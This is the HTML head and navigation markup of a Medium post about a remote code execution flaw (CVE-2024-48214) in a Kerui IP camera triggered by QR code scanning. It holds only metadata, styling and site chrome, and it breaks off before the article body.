<!doctype html><html lang="en"><head><title data-rh="true">Exploiting a Chinese camera for fun CVE-2024–48214 | by Shenhav Mor | Medium</title><meta data-rh="true" charset="utf-8"/><meta data-rh="true" name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,maximum-scale=1"/><meta data-rh="true" name="theme-color" content="#000000"/><meta data-rh="true" name="twitter:app:name:iphone" content="Medium"/><meta data-rh="true" name="twitter:app:id:iphone" content="828256236"/><meta data-rh="true" property="al:ios:app_name" content="Medium"/><meta data-rh="true" property="al:ios:app_store_id" content="828256236"/><meta data-rh="true" property="al:android:package" content="com.medium.reader"/><meta data-rh="true" property="fb:app_id" content="542599432471018"/><meta data-rh="true" property="og:site_name" content="Medium"/><meta data-rh="true" property="og:type" content="article"/><meta data-rh="true" property="article:published_time" content="2024-10-27T12:35:27.615Z"/><meta data-rh="true" name="title" content="Exploiting a Chinese camera for fun CVE-2024–48214 | by Shenhav Mor | Medium"/><meta data-rh="true" property="og:title" content="Exploiting a Chinese camera for fun CVE-2024–48214"/><meta data-rh="true" property="al:android:url" content="medium://p/2d56848870c2"/><meta data-rh="true" property="al:ios:url" content="medium://p/2d56848870c2"/><meta data-rh="true" property="al:android:app_name" content="Medium"/><meta data-rh="true" name="description" content="This article primarily discusses the key aspects of the CVE, The research journey was both fun and led to various other directions. My goal is to provide a comprehensive overview of the IoT research…"/><meta data-rh="true" property="og:description" content="Kerui IP camera QR Code scan to RCE"/><meta data-rh="true" property="og:url" content="https://medium.com/@shenhavmor/exploiting-a-chinese-camera-for-fun-cve-2024-48214-2d56848870c2"/><meta data-rh="true" property="al:web:url" content="https://medium.com/@shenhavmor/exploiting-a-chinese-camera-for-fun-cve-2024-48214-2d56848870c2"/><meta data-rh="true" property="og:image" content="https://miro.medium.com/v2/resize:fit:1200/1*yxvfrZ0nLAK6GldYPq6cTg.png"/><meta data-rh="true" property="article:author" content="https://medium.com/@shenhavmor"/><meta data-rh="true" name="author" content="Shenhav Mor"/><meta data-rh="true" name="robots" content="noindex,noarchive,follow,max-image-preview:large"/><meta data-rh="true" name="referrer" content="origin"/><meta data-rh="true" property="twitter:title" content="Exploiting a Chinese camera for fun CVE-2024–48214"/><meta data-rh="true" name="twitter:site" content="@Medium"/><meta data-rh="true" name="twitter:app:url:iphone" content="medium://p/2d56848870c2"/><meta data-rh="true" property="twitter:description" content="Kerui IP camera QR Code scan to RCE"/><meta data-rh="true" name="twitter:image:src" content="https://miro.medium.com/v2/resize:fit:1200/1*yxvfrZ0nLAK6GldYPq6cTg.png"/><meta data-rh="true" name="twitter:card" content="summary_large_image"/><meta data-rh="true" name="twitter:label1" content="Reading time"/><meta data-rh="true" name="twitter:data1" content="9 min read"/><link data-rh="true" rel="icon" href="https://miro.medium.com/v2/5d8de952517e8160e40ef9841c781cdc14a5db313057fa3c3de41c6f5b494b19"/><link data-rh="true" rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml"/><link data-rh="true" rel="apple-touch-icon" sizes="152x152" href="https://miro.medium.com/v2/resize:fill:304:304/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="120x120" href="https://miro.medium.com/v2/resize:fill:240:240/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="76x76" href="https://miro.medium.com/v2/resize:fill:152:152/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="apple-touch-icon" sizes="60x60" href="https://miro.medium.com/v2/resize:fill:120:120/10fd5c419ac61637245384e7099e131627900034828f4f386bdaa47a74eae156"/><link data-rh="true" rel="mask-icon" href="https://miro.medium.com/v2/resize:fill:1000:1000/7*GAOKVe--MXbEJmV9230oOQ.png" color="#171717"/><link data-rh="true" rel="preconnect" href="https://glyph.medium.com" crossOrigin=""/><link data-rh="true" id="glyph_preload_link" rel="preload" as="style" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" id="glyph_link" rel="stylesheet" type="text/css" href="https://glyph.medium.com/css/unbound.css"/><link data-rh="true" rel="author" href="https://medium.com/@shenhavmor"/><link data-rh="true" rel="canonical" href="https://medium.com/@shenhavmor/exploiting-a-chinese-camera-for-fun-cve-2024-48214-2d56848870c2"/><link data-rh="true" rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/2d56848870c2"/><script data-rh="true" type="application/ld+json">{"@context":"http:\u002F\u002Fschema.org","@type":"NewsArticle","image":["https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:1200\u002F1*yxvfrZ0nLAK6GldYPq6cTg.png"],"url":"https:\u002F\u002Fmedium.com\u002F@shenhavmor\u002Fexploiting-a-chinese-camera-for-fun-cve-2024-48214-2d56848870c2","dateCreated":"2024-10-27T12:30:48.919Z","datePublished":"2024-10-27T12:30:48.919Z","dateModified":"2024-11-14T10:04:12.169Z","headline":"Exploiting a Chinese camera for fun CVE-2024–48214 - Shenhav Mor - Medium","name":"Exploiting a Chinese camera for fun CVE-2024–48214 - Shenhav Mor - Medium","description":"This article primarily discusses the key aspects of the CVE, The research journey was both fun and led to various other directions. My goal is to provide a comprehensive overview of the IoT research…","identifier":"2d56848870c2","author":{"@type":"Person","name":"Shenhav Mor","url":"https:\u002F\u002Fmedium.com\u002F@shenhavmor"},"creator":["Shenhav Mor"],"publisher":{"@type":"Organization","name":"Medium","url":"https:\u002F\u002Fmedium.com\u002F","logo":{"@type":"ImageObject","width":272,"height":60,"url":"https:\u002F\u002Fmiro.medium.com\u002Fv2\u002Fresize:fit:544\u002F7*V1_7XP4snlmqrc_0Njontw.png"}},"mainEntityOfPage":"https:\u002F\u002Fmedium.com\u002F@shenhavmor\u002Fexploiting-a-chinese-camera-for-fun-cve-2024-48214-2d56848870c2"}</script><style type="text/css" data-fela-rehydration="533" data-fela-type="STATIC">html{box-sizing:border-box;-webkit-text-size-adjust:100%}*, *:before, *:after{box-sizing:inherit}body{margin:0;padding:0;text-rendering:optimizeLegibility;-webkit-font-smoothing:antialiased;color:rgba(0,0,0,0.8);position:relative;min-height:100vh}h1, h2, h3, h4, h5, h6, dl, dd, ol, ul, menu, figure, blockquote, p, pre, form{margin:0}menu, ol, ul{padding:0;list-style:none;list-style-image:none}main{display:block}a{color:inherit;text-decoration:none}a, button, input{-webkit-tap-highlight-color:transparent}img, svg{vertical-align:middle}button{background:transparent;overflow:visible}button, input, optgroup, select, textarea{margin:0}:root{--reach-tabs:1;--reach-menu-button:1}#speechify-root{font-family:Sohne, sans-serif}div[data-popper-reference-hidden="true"]{visibility:hidden;pointer-events:none}.grecaptcha-badge{visibility:hidden}
/*XCode style (c) Angel Garcia <angelgarcia.mail@gmail.com>*/.hljs {background: #fff;color: black;
}/* Gray DOCTYPE selectors like WebKit */
.xml .hljs-meta {color: #c0c0c0;
}.hljs-comment,
.hljs-quote {color: #007400;
}.hljs-tag,
.hljs-attribute,
.hljs-keyword,
.hljs-selector-tag,
.hljs-literal,
.hljs-name {color: #aa0d91;
}.hljs-variable,
.hljs-template-variable {color: #3F6E74;
}.hljs-code,
.hljs-string,
.hljs-meta .hljs-string {color: #c41a16;
}.hljs-regexp,
.hljs-link {color: #0E0EFF;
}.hljs-title,
.hljs-symbol,
.hljs-bullet,
.hljs-number {color: #1c00cf;
}.hljs-section,
.hljs-meta {color: #643820;
}.hljs-title.class_,
.hljs-class .hljs-title,
.hljs-type,
.hljs-built_in,
.hljs-params {color: #5c2699;
}.hljs-attr {color: #836C28;
}.hljs-subst {color: #000;
}.hljs-formula {background-color: #eee;font-style: italic;
}.hljs-addition {background-color: #baeeba;
}.hljs-deletion {background-color: #ffc8bd;
}.hljs-selector-id,
.hljs-selector-class {color: #9b703f;
}.hljs-doctag,
.hljs-strong {font-weight: bold;
}.hljs-emphasis {font-style: italic;
}
</style><style type="text/css" data-fela-rehydration="533" data-fela-type="KEYFRAME">@-webkit-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@-moz-keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}@keyframes k1{0%{opacity:0.8}50%{opacity:0.5}100%{opacity:0.8}}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE">.a{font-family:medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif}.b{font-weight:400}.c{background-color:rgba(255, 255, 255, 1)}.l{display:block}.m{position:sticky}.n{top:0}.o{z-index:500}.p{padding:0 24px}.q{align-items:center}.r{border-bottom:solid 1px #F2F2F2}.y{height:41px}.z{line-height:20px}.ab{display:flex}.ac{height:57px}.ae{flex:1 0 auto}.af{color:inherit}.ag{fill:inherit}.ah{font-size:inherit}.ai{border:inherit}.aj{font-family:inherit}.ak{letter-spacing:inherit}.al{font-weight:inherit}.am{padding:0}.an{margin:0}.ao{cursor:pointer}.ap:disabled{cursor:not-allowed}.aq:disabled{color:#6B6B6B}.ar:disabled{fill:#6B6B6B}.au{width:auto}.av path{fill:#242424}.aw{height:25px}.ax{margin-left:16px}.ay{border:none}.az{border-radius:20px}.ba{width:240px}.bb{background:#F9F9F9}.bc path{fill:#6B6B6B}.be{outline:none}.bf{font-family:sohne, "Helvetica Neue", Helvetica, Arial, sans-serif}.bg{font-size:14px}.bh{width:100%}.bi{padding:10px 20px 10px 0}.bj{background-color:transparent}.bk{color:#242424}.bl::placeholder{color:#6B6B6B}.bm{display:inline-block}.bn{margin-left:12px}.bo{margin-right:12px}.bp{border-radius:4px}.bq{margin-left:24px}.br{height:24px}.bx{background-color:#F9F9F9}.by{border-radius:50%}.bz{height:32px}.ca{width:32px}.cb{justify-content:center}.ch{max-width:680px}.ci{min-width:0}.cj{animation:k1 1.2s ease-in-out infinite}.ck{height:100vh}.cl{margin-bottom:16px}.cm{margin-top:48px}.cn{align-items:flex-start}.co{flex-direction:column}.cp{justify-content:space-between}.cq{margin-bottom:24px}.cw{width:80%}.cx{background-color:#F2F2F2}.dd{height:44px}.de{width:44px}.df{margin:auto 0}.dg{margin-bottom:4px}.dh{height:16px}.di{width:120px}.dj{width:80px}.dp{margin-bottom:8px}.dq{width:96%}.dr{width:98%}.ds{width:81%}.dt{margin-left:8px}.du{color:#6B6B6B}.dv{font-size:13px}.dw{height:100%}.ep{color:#FFFFFF}.eq{fill:#FFFFFF}.er{background:#1A8917}.es{border-color:#1A8917}.ew:disabled{cursor:inherit !important}.ex:disabled{opacity:0.3}.ey:disabled:hover{background:#1A8917}.ez:disabled:hover{border-color:#1A8917}.fa{border-radius:99em}.fb{border-width:1px}.fc{border-style:solid}.fd{box-sizing:border-box}.fe{text-decoration:none}.ff{text-align:center}.fi{margin-right:32px}.fj{position:relative}.fk{fill:#6B6B6B}.fn{background:transparent}.fo svg{margin-left:4px}.fp svg{fill:#6B6B6B}.fr{box-shadow:inset 0 0 0 1px rgba(0, 0, 0, 0.05)}.fs{position:absolute}.fz{margin:0 24px}.gd{background:rgba(255, 255, 255, 1)}.ge{border:1px solid #F2F2F2}.gf{box-shadow:0 1px 4px #F2F2F2}.gg{max-height:100vh}.gh{overflow-y:auto}.gi{left:0}.gj{top:calc(100vh + 100px)}.gk{bottom:calc(100vh + 100px)}.gl{width:10px}.gm{pointer-events:none}.gn{word-break:break-word}.go{word-wrap:break-word}.gp:after{display:block}.gq:after{content:""}.gr:after{clear:both}.gs{line-height:1.23}.gt{letter-spacing:0}.gu{font-style:normal}.gv{font-weight:700}.ia{align-items:baseline}.ib{width:48px}.ic{height:48px}.id{border:2px solid rgba(255, 255, 255, 1)}.ie{z-index:0}.if{box-shadow:none}.ig{border:1px solid rgba(0, 0, 0, 0.05)}.ih{margin-bottom:2px}.ii{flex-wrap:nowrap}.ij{font-size:16px}.ik{line-height:24px}.im{margin:0 8px}.in{display:inline}.io{color:#1A8917}.ip{fill:#1A8917}.is{flex:0 0 auto}.iv{flex-wrap:wrap}.iw{padding-left:8px}.ix{padding-right:8px}.jy> *{flex-shrink:0}.jz{overflow-x:scroll}.ka::-webkit-scrollbar{display:none}.kb{scrollbar-width:none}.kc{-ms-overflow-style:none}.kd{width:74px}.ke{flex-direction:row}.kf{z-index:2}.kg{margin-right:4px}.kj{-webkit-user-select:none}.kk{border:0}.kl{fill:rgba(117, 117, 117, 1)}.ko{outline:0}.kp{user-select:none}.kq> svg{pointer-events:none}.kz{cursor:progress}.la{opacity:1}.lb{padding:4px 0}.le{margin-top:0px}.lf{width:16px}.lg{display:inline-flex}.lm{max-width:100%}.ln{padding:8px 2px}.lo svg{color:#6B6B6B}.mf{line-height:1.58}.mg{letter-spacing:-0.004em}.mh{font-family:source-serif-pro, Georgia, Cambria, "Times New Roman", Times, serif}.nc{margin-bottom:-0.46em}.nd{text-decoration:underline}.nj{overflow-x:auto}.nk{font-family:source-code-pro, Menlo, Monaco, "Courier New", Courier, monospace}.nl{padding:32px}.nm{border:1px solid #E5E5E5}.nn{line-height:1.4}.no{letter-spacing:-0.022em}.np{margin-top:-0.2em}.nq{margin-bottom:-0.2em}.nr{white-space:pre}.ns{min-width:fit-content}.nt{margin-left:auto}.nu{margin-right:auto}.nv{max-width:855px}.nw{clear:both}.ny{cursor:zoom-in}.nz{z-index:auto}.ob{height:auto}.oc{margin-top:10px}.od{max-width:728px}.og{max-width:555px}.oh{max-width:563px}.oi{max-width:1536px}.oj{max-width:670px}.ok{max-width:3024px}.ol{max-width:882px}.om{max-width:662px}.on{max-width:773px}.oo{max-width:327px}.op{max-width:255px}.oq{max-width:308px}.or{line-height:1.12}.os{font-weight:600}.pn{margin-bottom:-0.28em}.pt{max-width:654px}.pu{max-width:390px}.pv{max-width:404px}.pw{max-width:880px}.px{max-width:311px}.py{margin-bottom:40px}.pz{margin-top:6px}.qa{margin-top:8px}.qb{margin-right:8px}.qc{padding:8px 16px}.qd{border-radius:100px}.qe{transition:background 300ms ease}.qg{white-space:nowrap}.qh{margin-bottom:26px}.qi{border-top:none}.qj{margin-bottom:50px}.qk{height:52px}.ql{max-height:52px}.qm{box-sizing:content-box}.qn{position:static}.qo{z-index:1}.qq{max-width:155px}.qw{margin-right:20px}.qx{margin-bottom:64px}.rm{height:64px}.rn{width:64px}.ro{align-self:flex-end}.rp{color:rgba(255, 255, 255, 1)}.rq{fill:rgba(255, 255, 255, 1)}.rr{background:rgba(25, 25, 25, 1)}.rs{border-color:rgba(25, 25, 25, 1)}.rv:disabled{opacity:0.1}.rw:disabled:hover{background:rgba(25, 25, 25, 1)}.rx:disabled:hover{border-color:rgba(25, 25, 25, 1)}.ry{flex:1 1 auto}.se{padding-right:4px}.sf{font-weight:500}.ss{white-space:pre-wrap}.st{margin-top:16px}.su{margin-bottom:54px}.sv{height:0px}.sw{gap:18px}.sx{fill:rgba(61, 61, 61, 1)}.tj{border-bottom:solid 1px #E5E5E5}.tk{margin-top:72px}.tl{padding:24px 0}.tm{margin-bottom:0px}.tn{margin-right:16px}.as:hover:not(:disabled){color:rgba(25, 25, 25, 1)}.at:hover:not(:disabled){fill:rgba(25, 25, 25, 1)}.et:hover{background:#156D12}.eu:hover{border-color:#156D12}.ev:hover{cursor:pointer}.fl:hover{color:#242424}.fm:hover{fill:#242424}.fq:hover svg{fill:#242424}.ft:hover{background-color:rgba(0, 0, 0, 0.1)}.il:hover{text-decoration:underline}.iq:hover:not(:disabled){color:#156D12}.ir:hover:not(:disabled){fill:#156D12}.kn:hover{fill:rgba(8, 8, 8, 1)}.lc:hover{fill:#000000}.ld:hover p{color:#000000}.lp:hover svg{color:#000000}.qf:hover{background-color:#F2F2F2}.rl:hover{background-color:none}.rt:hover{background:#000000}.ru:hover{border-color:#242424}.sy:hover{fill:rgba(25, 25, 25, 1)}.bd:focus-within path{fill:#242424}.km:focus{fill:rgba(8, 8, 8, 1)}.lq:focus svg{color:#000000}.oa:focus{transform:scale(1.01)}.kr:active{border-style:none}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="all and (min-width: 1080px)">.d{display:none}.bw{width:64px}.cg{margin:0 64px}.cv{height:48px}.dc{margin-bottom:52px}.do{margin-bottom:48px}.ef{font-size:14px}.eg{line-height:20px}.em{font-size:13px}.eo{padding:5px 12px}.fh{display:flex}.fy{margin-bottom:50px}.gc{max-width:680px}.hq{font-size:42px}.hr{margin-top:1.19em}.hs{margin-bottom:32px}.ht{line-height:52px}.hu{letter-spacing:-0.011em}.hz{align-items:center}.jk{border-top:solid 1px #F2F2F2}.jl{border-bottom:solid 1px #F2F2F2}.jm{margin:32px 0 0}.jn{padding:3px 8px}.jw> *{margin-right:24px}.jx> :last-child{margin-right:0}.ky{margin-top:0px}.ll{margin:0}.my{font-size:20px}.mz{margin-top:2.14em}.na{line-height:32px}.nb{letter-spacing:-0.003em}.ni{margin-top:56px}.pj{font-size:24px}.pk{margin-top:1.95em}.pl{line-height:30px}.pm{letter-spacing:-0.016em}.ps{margin-top:0.94em}.qv{display:inline-block}.qy{flex-direction:row}.rb{margin-bottom:0}.rc{margin-right:20px}.rz{max-width:500px}.sq{line-height:24px}.sr{letter-spacing:0}.td{margin:40px 0 0}.ti{padding-top:72px}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="all and (max-width: 1079.98px)">.e{display:none}.kx{margin-top:0px}.oe{margin-left:auto}.of{text-align:center}.qu{display:inline-block}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="all and (max-width: 903.98px)">.f{display:none}.kw{margin-top:0px}.qt{display:inline-block}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="all and (max-width: 727.98px)">.g{display:none}.ku{margin-top:0px}.kv{margin-right:0px}.qs{display:inline-block}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="all and (max-width: 551.98px)">.h{display:none}.s{display:flex}.t{justify-content:space-between}.bs{width:24px}.cc{margin:0 24px}.cr{height:40px}.cy{margin-bottom:44px}.dk{margin-bottom:32px}.dx{font-size:13px}.dy{line-height:20px}.eh{padding:0px 8px 1px}.fu{margin-bottom:2px}.gw{font-size:32px}.gx{margin-top:1.01em}.gy{margin-bottom:24px}.gz{line-height:38px}.ha{letter-spacing:-0.014em}.hv{align-items:flex-start}.it{flex-direction:column}.iy{margin:24px -24px 0}.iz{padding:0}.jo> *{margin-right:8px}.jp> :last-child{margin-right:24px}.kh{margin-left:0px}.ks{margin-top:0px}.kt{margin-right:0px}.lh{margin:0}.lr{border:1px solid #F2F2F2}.ls{border-radius:99em}.lt{padding:0px 16px 0px 12px}.lu{height:38px}.lv{align-items:center}.lx svg{margin-right:8px}.mi{font-size:18px}.mj{margin-top:1.56em}.mk{line-height:28px}.ml{letter-spacing:-0.003em}.ne{margin-top:40px}.ot{font-size:20px}.ou{margin-top:1.2em}.ov{line-height:24px}.ow{letter-spacing:0}.po{margin-top:0.67em}.qr{display:inline-block}.rj{margin-bottom:20px}.rk{margin-right:0}.sd{max-width:100%}.sg{font-size:24px}.sh{line-height:30px}.si{letter-spacing:-0.016em}.sz{margin:32px 0 0}.te{padding-top:48px}.lw:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="all and (min-width: 904px) and (max-width: 1079.98px)">.i{display:none}.bv{width:64px}.cf{margin:0 64px}.cu{height:48px}.db{margin-bottom:52px}.dn{margin-bottom:48px}.ed{font-size:14px}.ee{line-height:20px}.ek{font-size:13px}.el{padding:5px 12px}.fg{display:flex}.fx{margin-bottom:50px}.gb{max-width:680px}.hl{font-size:42px}.hm{margin-top:1.19em}.hn{margin-bottom:32px}.ho{line-height:52px}.hp{letter-spacing:-0.011em}.hy{align-items:center}.jg{border-top:solid 1px #F2F2F2}.jh{border-bottom:solid 1px #F2F2F2}.ji{margin:32px 0 0}.jj{padding:3px 8px}.ju> *{margin-right:24px}.jv> :last-child{margin-right:0}.lk{margin:0}.mu{font-size:20px}.mv{margin-top:2.14em}.mw{line-height:32px}.mx{letter-spacing:-0.003em}.nh{margin-top:56px}.pf{font-size:24px}.pg{margin-top:1.95em}.ph{line-height:30px}.pi{letter-spacing:-0.016em}.pr{margin-top:0.94em}.qz{flex-direction:row}.rd{margin-bottom:0}.re{margin-right:20px}.sa{max-width:500px}.so{line-height:24px}.sp{letter-spacing:0}.tc{margin:40px 0 0}.th{padding-top:72px}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="all and (min-width: 728px) and (max-width: 903.98px)">.j{display:none}.w{display:flex}.x{justify-content:space-between}.bu{width:64px}.ce{margin:0 48px}.ct{height:48px}.da{margin-bottom:52px}.dm{margin-bottom:48px}.eb{font-size:13px}.ec{line-height:20px}.ej{padding:0px 8px 1px}.fw{margin-bottom:50px}.ga{max-width:680px}.hg{font-size:42px}.hh{margin-top:1.19em}.hi{margin-bottom:32px}.hj{line-height:52px}.hk{letter-spacing:-0.011em}.hx{align-items:center}.jc{border-top:solid 1px #F2F2F2}.jd{border-bottom:solid 1px #F2F2F2}.je{margin:32px 0 0}.jf{padding:3px 8px}.js> *{margin-right:24px}.jt> :last-child{margin-right:0}.lj{margin:0}.mq{font-size:20px}.mr{margin-top:2.14em}.ms{line-height:32px}.mt{letter-spacing:-0.003em}.ng{margin-top:56px}.pb{font-size:24px}.pc{margin-top:1.95em}.pd{line-height:30px}.pe{letter-spacing:-0.016em}.pq{margin-top:0.94em}.ra{flex-direction:row}.rf{margin-bottom:0}.rg{margin-right:20px}.sb{max-width:500px}.sm{line-height:24px}.sn{letter-spacing:0}.tb{margin:40px 0 0}.tg{padding-top:72px}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="all and (min-width: 552px) and (max-width: 727.98px)">.k{display:none}.u{display:flex}.v{justify-content:space-between}.bt{width:24px}.cd{margin:0 24px}.cs{height:40px}.cz{margin-bottom:44px}.dl{margin-bottom:32px}.dz{font-size:13px}.ea{line-height:20px}.ei{padding:0px 8px 1px}.fv{margin-bottom:2px}.hb{font-size:32px}.hc{margin-top:1.01em}.hd{margin-bottom:24px}.he{line-height:38px}.hf{letter-spacing:-0.014em}.hw{align-items:flex-start}.iu{flex-direction:column}.ja{margin:24px 0 0}.jb{padding:0}.jq> *{margin-right:8px}.jr> :last-child{margin-right:8px}.ki{margin-left:0px}.li{margin:0}.ly{border:1px solid #F2F2F2}.lz{border-radius:99em}.ma{padding:0px 16px 0px 12px}.mb{height:38px}.mc{align-items:center}.me svg{margin-right:8px}.mm{font-size:18px}.mn{margin-top:1.56em}.mo{line-height:28px}.mp{letter-spacing:-0.003em}.nf{margin-top:40px}.ox{font-size:20px}.oy{margin-top:1.2em}.oz{line-height:24px}.pa{letter-spacing:0}.pp{margin-top:0.67em}.rh{margin-bottom:20px}.ri{margin-right:0}.sc{max-width:100%}.sj{font-size:24px}.sk{line-height:30px}.sl{letter-spacing:-0.016em}.ta{margin:32px 0 0}.tf{padding-top:48px}.md:hover{border-color:#E5E5E5}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="print">.qp{display:none}</style><style type="text/css" data-fela-rehydration="533" data-fela-type="RULE" media="(prefers-reduced-motion: no-preference)">.nx{transition:transform 300ms cubic-bezier(0.2, 0, 0.2, 1)}</style></head><body><div id="root"><div class="a b c"><div class="d e f g h i j k"></div><script>document.domain = document.domain;</script><div class="l c"><div class="l m n o c"><div class="p q r s t u v w x i d y z"><a class="du ag dv bf ak b am an ao ap aq ar as at s u w i d q dw z" href="https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F2d56848870c2&amp;%7Efeature=LoOpenInAppButton&amp;%7Echannel=ShowPostUnderUser&amp;source=---top_nav_layout_nav----------------------------------" rel="noopener follow">Open in app<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" fill="none" viewBox="0 0 10 10" class="dt"><path fill="currentColor" d="M.985 8.485a.375.375 0 1 0 .53.53zM8.75 1.25h.375A.375.375 0 0 0 8.75.875zM8.375 6.5a.375.375 0 1 0 .75 0zM3.5.875a.375.375 0 1 0 0 .75zm-1.985 8.14 7.5-7.5-.53-.53-7.5 7.5zm6.86-7.765V6.5h.75V1.25zM3.5 1.625h5.25v-.75H3.5z"></path></svg></a><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" rel="noopener follow" href="/m/signin?operation=login&amp;redirect=https%3A%2F%2Fmedium.com%2F%40shenhavmor%2Fexploiting-a-chinese-camera-for-fun-cve-2024-48214-2d56848870c2&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------">Sign in</a></span></p></div></div></div><div class="p q r ab ac"><div class="ab q ae"><a class="af ag ah ai aj ak al am an ao ap aq ar as at ab" aria-label="Homepage" data-testid="headerMediumLogo" rel="noopener follow" href="/?source=---top_nav_layout_nav----------------------------------"><svg xmlns="http://www.w3.org/2000/svg" width="719" height="160" fill="none" viewBox="0 0 719 160" class="au av aw"><path fill="#242424" d="m174.104 9.734.215-.047V8.02H130.39L89.6 103.89 48.81 8.021H1.472v1.666l.212.047c8.018 1.81 12.09 4.509 12.09 14.242V137.93c0 9.734-4.087 12.433-12.106 14.243l-.212.047v1.671h32.118v-1.665l-.213-.048c-8.018-1.809-12.089-4.509-12.089-14.242V30.586l52.399 123.305h2.972l53.925-126.743V140.75c-.687 7.688-4.721 10.062-11.982 11.701l-.215.05v1.652h55.948v-1.652l-.215-.05c-7.269-1.639-11.4-4.013-12.087-11.701l-.037-116.774h.037c0-9.733 4.071-12.432 12.087-14.242m25.555 75.488c.915-20.474 8.268-35.252 20.606-35.507 3.806.063 6.998 1.312 9.479 3.714 5.272 5.118 7.751 15.812 7.368 31.793zm-.553 5.77h65.573v-.275c-.186-15.656-4.721-27.834-13.466-36.196-7.559-7.227-18.751-11.203-30.507-11.203h-.263c-6.101 0-13.584 1.48-18.909 4.16-6.061 2.807-11.407 7.003-15.855 12.511-7.161 8.874-11.499 20.866-12.554 34.343q-.05.606-.092 1.212a50 50 0 0 0-.065 1.151 85.807 85.807 0 0 0-.094 5.689c.71 30.524 17.198 54.917 46.483 54.917 25.705 0 40.675-18.791 44.407-44.013l-1.886-.664c-6.557 13.556-18.334 21.771-31.738 20.769-18.297-1.369-32.314-19.922-31.042-42.395m139.722 41.359c-2.151 5.101-6.639 7.908-12.653 7.908s-11.513-4.129-15.418-11.63c-4.197-8.053-6.405-19.436-6.405-32.92 0-28.067 8.729-46.22 22.24-46.22 5.657 0 10.111 2.807 12.236 7.704zm43.499 20.008c-8.019-1.897-12.089-4.722-12.089-14.951V1.309l-48.716 14.353v1.757l.299-.024c6.72-.543 11.278.386 13.925 2.83 2.072 1.915 3.082 4.853 3.082 8.987v18.66c-4.803-3.067-10.516-4.56-17.448-4.56-14.059 0-26.909 5.92-36.176 16.672-9.66 11.205-14.767 26.518-14.767 44.278-.003 31.72 15.612 53.039 38.851 53.039 13.595 0 24.533-7.449 29.54-20.013v16.865h43.711v-1.746zM424.1 19.819c0-9.904-7.468-17.374-17.375-17.374-9.859 0-17.573 7.632-17.573 17.374s7.721 17.374 17.573 17.374c9.907 0 17.375-7.47 17.375-17.374m11.499 132.546c-8.019-1.897-12.089-4.722-12.089-14.951h-.035V43.635l-43.714 12.551v1.705l.263.024c9.458.842 12.047 4.1 12.047 15.152v81.086h43.751v-1.746zm112.013 0c-8.018-1.897-12.089-4.722-12.089-14.951V43.635l-41.621 12.137v1.71l.246.026c7.733.813 9.967 4.257 9.967 15.36v59.279c-2.578 5.102-7.415 8.131-13.274 8.336-9.503 0-14.736-6.419-14.736-18.073V43.638l-43.714 12.55v1.703l.262.024c9.459.84 12.05 4.097 12.05 15.152v50.17a56.3 56.3 0 0 0 .91 10.444l.787 3.423c3.701 13.262 13.398 20.197 28.59 20.197 12.868 0 24.147-7.966 29.115-20.43v17.311h43.714v-1.747zm169.818 1.788v-1.749l-.213-.05c-8.7-2.006-12.089-5.789-12.089-13.49v-63.79c0-19.89-11.171-31.761-29.883-31.761-13.64 0-25.141 7.882-29.569 20.16-3.517-13.01-13.639-20.16-28.606-20.16-13.146 0-23.449 6.938-27.869 18.657V43.643L545.487 55.68v1.715l.263.024c9.345.829 12.047 4.181 12.047 14.95v81.784h40.787v-1.746l-.215-.053c-6.941-1.631-9.181-4.606-9.181-12.239V66.998c1.836-4.289 5.537-9.37 12.853-9.37 9.086 0 13.692 6.296 13.692 18.697v77.828h40.797v-1.746l-.215-.053c-6.94-1.631-9.18-4.606-9.18-12.239V75.066a42 42 0 0 0-.578-7.26c1.947-4.661 5.86-10.177 13.475-10.177 9.214 0 13.691 6.114 13.691 18.696v77.828z"></path></svg></a><div class="ax h"><div class="ab ay az ba bb q bc bd"><div class="bm" aria-hidden="false" aria-describedby="searchResults" aria-labelledby="searchResults"></div><div class="bn bo ab"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" 